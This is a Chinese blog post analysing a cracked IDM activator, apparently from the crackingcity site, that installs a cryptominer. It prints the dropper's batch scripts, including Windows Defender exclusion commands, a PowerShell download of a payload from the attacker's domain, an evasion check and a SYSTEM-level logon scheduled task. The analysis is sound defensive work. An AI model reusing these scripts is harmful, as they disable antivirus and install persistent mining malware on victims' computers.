---
title: CrackingCity发布IDM下载器破解补丁携带挖矿的简要分析
typora-root-url: Cracked-Software-with-Miner
date: 2024-05-04 00:20:47
tags: 
- re
- virus
- miner
- Reverse
- malware
- malicious
- dlIhost.exe
- WinRing0x64.sys
categories: Reverse
---

# IDM破解补丁携带挖矿

## 前言

网上冲浪偶然发现了一个IDM破解，下载地址在www[.]crackingcity[.]com/idm-crack/

## 初步检测

下载后得到一个IDM安装包和一个压缩包，压缩包里放着一个激活器之类的东西

![image-20240503225043582](image-20240503225043582.png)

提供的IDM安装包有数字签名，校验值也没什么问题

![image-20240503225455563](image-20240503225455563.png)

但是激活器被杀软报毒，提示下载器木马，随即上传到微步：[样本报告](https://s.threatbook.com/report/file/7822fa6c35cbd1cfb95c780970deef14d8b53c62ade3a4bcf63c494c3f2e5bbd)

命中两个Miner规则：

![image-20240503225734789](image-20240503225734789.png)

## 7z解包

Exeinfope扫一下，提示是7z自解压文件，使用7z SFX Archive splitter解包

![image-20240503230009082](image-20240503230009082.png)

### 配置文件

可以看到配置文件：

```bash
;!@Install@!UTF-8!
Title=""
Progress="no"
GUIFlags="8"
OverwriteMode="0"
InstallPath="%Temp%\ytmp"
ExtractPathText=""
ExtractPathTitle=""
ExtractTitle=""
ExtractDialogText=""
ExtractCancelText=""
SetEnvironment="l2=crackingcity"
SetEnvironment="l3=un#912345678@rar"
SetEnvironment="ppD=%AppData%"
SetEnvironment="PW=tmp@tmp420"
SetEnvironment="mainExePatch=%%S"
RunProgram="hidcon:\"%%T\\main.bat\""
RunProgram="nowait:hidcon:\"%%T\\IDM0.bat\""
RunProgram="\"%%T\\IDM.bat\""
;!@InstallEnd@!
```

运行了压缩包里的main.bat，随后运行了IDM0.bat和IDM.bat

值得注意的是，前面使用SetEnvironment设置了几个环境变量，一会在bat脚本里都会用到

### 压缩包文件

压缩包内文件如图：

![image-20240503231430814](image-20240503231430814.png)

#### main.bat

查看main.bat内容：

```bash
@ECHO OFF

ATTRIB -S +H .

7za e files.tmp -p%PW% -aoa IDM0.bat
7za e files.tmp -p%PW% -aoa IDM.bat
7za e files.tmp -p%PW% -aoa NSudo86x.exe
7za e files.tmp -p%PW% -aoa AB2EF.exe
7za e files.tmp -p%PW% -aoa UpdateTask.xml

DEL /F /Q /A files.tmp
DEL /F /Q /A %0

EXIT
```

这里调用7z执行文件忽略目录结构（e参数），使用密码（-p），替换所有重复文件（-aoa）去解压文件

可以知道这个文件是需要密码的，密码是环境变量`PW`，这个在上面的配置文件中有设置`SetEnvironment="PW=tmp@tmp420"`，所以密码为`tmp@tmp420`，解压后得到三个文件

![image-20240503232213685](image-20240503232213685.png)

这里IDM0.bat和IDM.bat是同步执行的，因为有nowait前缀

```bash
RunProgram="hidcon:\"%%T\\main.bat\""
RunProgram="nowait:hidcon:\"%%T\\IDM0.bat\""
RunProgram="\"%%T\\IDM.bat\""
```

| Prefix     | Description                                                  |
| ---------- | ------------------------------------------------------------ |
| **hidcon** | Hides console windows. For example,`RunProgram="hidcon:install.cmd"`executes "install.cmd" and completely hides its console window.<br />隐藏控制窗口。例如`RunProgram="hidcon:install.cmd"`执行"install.cmd"并且完全隐藏它的控制台窗口。 |
| **nowait** | Forces not to wait until an execution command completes its operation.By default the execution commands within every installation scenario are processed according to the order of appearance in the config file, and the next command waits until the previous command is complete. If '`nowait`' prefix is used, the commands that appear after the command with this prefix are executed immediately (i.e. launching the next executable, deleting folders, creating shortcuts, etc).This prefix is disabled when the SFX archive is extracted to a temporary folder.<br />强制不等待一个执行命令完成它的操作。默认来说，每一个配置文件里的执行命令都是按照它在文件里出现的顺序执行的，并且下一个命令会等待上一个命令执行完毕。如果使用了'`nowait`'前缀，有这个前缀的命令后面的命令也会被立即执行（例如，启动下一个可执行程序、删除文件夹、创建快捷方式等）。当SFX文档被解压到临时目录时，这个命令不可用 |

#### IDM0.bat

那么先来看一下文件大小比较小的，IDM0.bat，文件内容如下：

```bash
@ECHO OFF
SET "NUL=1>NUL 2>NUL"
SETLOCAL ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS

REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" | FIND /I "1" > NUL && GOTO EndScript
REG QUERY "HKLM\Hardware\Description\System\CentralProcessor\0" | FIND /I "x86" > NUL && SET "OS_Bit=32Bit" || SET "OS_Bit=64Bit"

IF /I "!OS_Bit!" EQU "64Bit" (

	MD "!ppD!\DLL"
	ATTRIB +S +H "!ppD!\DLL"

	call :exportXML

	POWERSHELL -Command Add-MpPreference -ExclusionPath "!ppD!\DLL" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "dlIhost.exe" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "NSudo86x.exe" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "7za.exe" -Force %NUL%

	POWERSHELL -Command "Invoke-WebRequest 'https://www.!l2!.com/VScan/dlIhost.7z' -OutFile '!ppD!\DLL\dlIhost.7z'" %NUL%
	IF /I NOT "!errorlevel!" EQU "0" (
		DEL /F /Q /A "!ppD!\DLL\dlIhost.7z" %NUL%
		TIMEOUT /T 3 %NUL%
		POWERSHELL -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.!l2!.com/VScan/dlIhost.7z', '!ppD!\DLL\dlIhost.7z')" %NUL%
	)

	7za e "!ppD!\DLL\dlIhost.7z" -o"!ppD!\DLL" -p!l3! -aoa %NUL%
	DEL /F /Q /A "!ppD!\DLL\dlIhost.7z" %NUL%

	schtasks /create /xml ".\UpdateTask.xml" /tn "UpdateTask" /f %NUL%
)

:EndScript
ENDLOCAL
DEL /F /Q /A 7za.exe %NUL%
DEL /F /Q /A UpdateTask.xml %NUL%
DEL /F /Q /A %0 %NUL%
EXIT

:exportXML
echo ^<?xml version="1.0" encoding="UTF-16"?^> > UpdateTask.xml
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^> >> UpdateTask.xml
echo   ^<Triggers^> >> UpdateTask.xml
echo     ^<LogonTrigger^> >> UpdateTask.xml
echo       ^<Enabled^>true^</Enabled^> >> UpdateTask.xml
echo     ^</LogonTrigger^> >> UpdateTask.xml
echo   ^</Triggers^> >> UpdateTask.xml
echo   ^<Principals^> >> UpdateTask.xml
echo     ^<Principal id="Author"^> >> UpdateTask.xml
echo       ^<UserId^>S-1-5-18^</UserId^> >> UpdateTask.xml
echo       ^<RunLevel^>HighestAvailable^</RunLevel^> >> UpdateTask.xml
echo     ^</Principal^> >> UpdateTask.xml
echo   ^</Principals^> >> UpdateTask.xml
echo   ^<Settings^> >> UpdateTask.xml
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^> >> UpdateTask.xml
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^> >> UpdateTask.xml
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^> >> UpdateTask.xml
echo     ^<AllowHardTerminate^>false^</AllowHardTerminate^> >> UpdateTask.xml
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^> >> UpdateTask.xml
echo     ^<RunOnlyIfNetworkAvailable^>true^</RunOnlyIfNetworkAvailable^> >> UpdateTask.xml
echo     ^<IdleSettings^> >> UpdateTask.xml
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^> >> UpdateTask.xml
echo       ^<RestartOnIdle^>false^</RestartOnIdle^> >> UpdateTask.xml
echo     ^</IdleSettings^> >> UpdateTask.xml
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^> >> UpdateTask.xml
echo     ^<Enabled^>true^</Enabled^> >> UpdateTask.xml
echo     ^<Hidden^>false^</Hidden^> >> UpdateTask.xml
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^> >> UpdateTask.xml
echo     ^<WakeToRun^>false^</WakeToRun^> >> UpdateTask.xml
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^> >> UpdateTask.xml
echo     ^<Priority^>7^</Priority^> >> UpdateTask.xml
echo     ^<RestartOnFailure^> >> UpdateTask.xml
echo       ^<Interval^>PT30M^</Interval^> >> UpdateTask.xml
echo       ^<Count^>3^</Count^> >> UpdateTask.xml
echo     ^</RestartOnFailure^> >> UpdateTask.xml
echo   ^</Settings^> >> UpdateTask.xml
echo   ^<Actions Context="Author"^> >> UpdateTask.xml
echo     ^<Exec^> >> UpdateTask.xml
echo       ^<Command^>%AppData%\Dll\dlIhost.exe^</Command^> >> UpdateTask.xml
echo     ^</Exec^> >> UpdateTask.xml
echo   ^</Actions^> >> UpdateTask.xml
echo ^</Task^> >> UpdateTask.xml
exit/b

```

脚本首先检测了一下环境，判断是否显示属性为系统&隐藏(Hidden + System)的文件，如果显示，就直接清除垃圾退出脚本。此外检测了系统位数

```bash
REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" | FIND /I "1" > NUL && GOTO EndScript
REG QUERY "HKLM\Hardware\Description\System\CentralProcessor\0" | FIND /I "x86" > NUL && SET "OS_Bit=32Bit" || SET "OS_Bit=64Bit"
```

随后是系统位数的判断，只有64位系统才能执行下面的恶意代码

```bash
IF /I "!OS_Bit!" EQU "64Bit" (

	MD "!ppD!\DLL"
	ATTRIB +S +H "!ppD!\DLL"

	call :exportXML

	POWERSHELL -Command Add-MpPreference -ExclusionPath "!ppD!\DLL" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "dlIhost.exe" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "NSudo86x.exe" -Force %NUL%
	POWERSHELL -Command Add-MpPreference -ExclusionProcess "7za.exe" -Force %NUL%

	POWERSHELL -Command "Invoke-WebRequest 'https://www.!l2!.com/VScan/dlIhost.7z' -OutFile '!ppD!\DLL\dlIhost.7z'" %NUL%
	IF /I NOT "!errorlevel!" EQU "0" (
		DEL /F /Q /A "!ppD!\DLL\dlIhost.7z" %NUL%
		TIMEOUT /T 3 %NUL%
		POWERSHELL -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.!l2!.com/VScan/dlIhost.7z', '!ppD!\DLL\dlIhost.7z')" %NUL%
	)

	7za e "!ppD!\DLL\dlIhost.7z" -o"!ppD!\DLL" -p!l3! -aoa %NUL%
	DEL /F /Q /A "!ppD!\DLL\dlIhost.7z" %NUL%

	schtasks /create /xml ".\UpdateTask.xml" /tn "UpdateTask" /f %NUL%
)
```
上面先创建了一个隐藏的文件夹，这个变量`ppD`在上面的配置文件中被设置成`%AppData%`，创建的文件夹就在`C:\Users\<用户名>\AppData\Roaming\Dll`，随后调用了`exportXML`同目录下生成一个xml文件，文件内容稍后下面贴出来，随后的四条命令调用了Powershell添加Windows Defender的排除项

![image-20240503234325335](image-20240503234325335.png)

然后又调用Powershell，进行下载文件，

![image-20240503234613920](image-20240503234613920.png)这里网址里包含了变量`l2`，同样在上面设置变量为`crackingcity`，所以这里从www[.]crackingcity[.]com/VScan/dlIhost.7z下载文件，下载到目录`C:\Users\<用户名>\AppData\Roaming\Dll\dlIhost.7z`

随后是调用7z解压刚下载的压缩包，密码在变量`l3`中，值为`un#912345678@rar`，删除下载的压缩包后添加计划任务，xml文件就是开头调用`exportXML`生成的，内容如下：

```xml
<?xml version="1.0" encoding="UTF-16"?> 
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> 
  <Triggers> 
    <LogonTrigger> 
      <Enabled>true</Enabled> 
    </LogonTrigger> 
  </Triggers> 
  <Principals> 
    <Principal id="Author"> 
      <UserId>S-1-5-18</UserId> 
      <RunLevel>HighestAvailable</RunLevel> 
    </Principal> 
  </Principals> 
  <Settings> 
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> 
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> 
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> 
    <AllowHardTerminate>false</AllowHardTerminate> 
    <StartWhenAvailable>true</StartWhenAvailable> 
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable> 
    <IdleSettings> 
      <StopOnIdleEnd>false</StopOnIdleEnd> 
      <RestartOnIdle>false</RestartOnIdle> 
    </IdleSettings> 
    <AllowStartOnDemand>true</AllowStartOnDemand> 
    <Enabled>true</Enabled> 
    <Hidden>false</Hidden> 
    <RunOnlyIfIdle>false</RunOnlyIfIdle> 
    <WakeToRun>false</WakeToRun> 
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    <Priority>7</Priority> 
    <RestartOnFailure> 
      <Interval>PT30M</Interval> 
      <Count>3</Count> 
    </RestartOnFailure> 
  </Settings> 
  <Actions Context="Author"> 
    <Exec> 
      <Command>C:\Users\<用户名>\AppData\Roaming\Dll\dlIhost.exe</Command> 
    </Exec> 
  </Actions> 
</Task> 
```

可以看到，用户登录时会触发这个任务，执行可执行文件`C:\Users\<用户名>\AppData\Roaming\Dll\dlIhost.exe`

这个脚本的任务到此为止了

另一个IDM.bat看起来是可用的激活工具，大致看了一下没发现有什么特别明显的异常行为，剩下的恶意内容就在dlIhost.exe里了，查看字符串可知这是个挖矿病毒

![image-20240504192858091](/image-20240504192858091.png)

编译时间为2024年3月30日，包内另一个WinRing0x64.sys则是一个开源的读写驱动

![image-20240504002855372](image-20240504002855372.png)

![image-20240504001624826](image-20240504001624826.png)

![image-20240504001804876](image-20240504001804876.png)

## 尾声

压缩包里还有一个NSudo86x.exe，搜索一下是一个开源的提权类的软件（[GitHub地址](https://github.com/M2TeamArchived/NSudo)）不过这里好像没有用到

另外，早在去年就已经有人受这个网站发布的IDM所害

![image-20240504002034817](image-20240504002034817.png)

![image-20240504002513769](image-20240504002513769.png)

国内并没有搜索到太多关于这个网站发布的IDM携带挖矿的事件，可能实在是在国内有点冷门

## 样本hash

| SHA256                                                       |
| ------------------------------------------------------------ |
| 20bab1daa16f5e5d007b457bde1173adcaab22d2d94d5ebae5fcef1de653fa0f |
| a67109836839f25002d6a6e56666d6f94f7aafbd9a57c344b03b7ce55c69a32e |
| 7822fa6c35cbd1cfb95c780970deef14d8b53c62ade3a4bcf63c494c3f2e5bbd |
|                                                              |



## 参考资料

[Prefixes for execution commands (olegscherbakov.github.io)](https://olegscherbakov.github.io/7zSFX/)

[7z自解压文件解包软件](https://olegscherbakov.github.io/7zSFX/files/7z_splitter_1017.7z)

[windows 7 - What is the difference between the ShowSuperHidden and SuperHidden registry values? - Super User](https://superuser.com/questions/1240383/what-is-the-difference-between-the-showsuperhidden-and-superhidden-registry-valu)

[LogonTrigger 对象 - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/taskschd/logontrigger)
